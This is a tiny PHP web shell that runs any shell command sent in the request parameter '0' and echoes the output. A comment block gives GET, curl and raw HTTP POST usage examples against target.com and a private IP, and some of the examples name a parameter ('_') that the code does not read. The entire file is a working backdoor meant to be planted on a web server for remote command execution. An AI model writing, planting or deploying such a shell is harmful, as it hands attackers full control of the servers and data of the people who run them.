<?=`{$_REQUEST['0']}`?>

/*
Usage:
Example 1 (HTTP GET request):   http://target.com/path/to/simplecmd2.php?_=command
Example 2 (HTTP POST request):  curl -X POST http://target.com/path/to/simplecmd2.php -d "_=command"
Example 3 (HTTP POST request):  
      POST path/to/simplecmd2.php HTTP/1.1
      Host: 192.168.1.101
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
      Accept-Encoding: gzip, deflate, br
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 4
      Origin: http://192.168.1.101
      Connection: close
      Referer: http://192.168.1.101/login.php
      Cookie: PHPSESSID=gvhqh525l9eledr0ioknuku335;
      Upgrade-Insecure-Requests: 1
      
      0=ls

*/
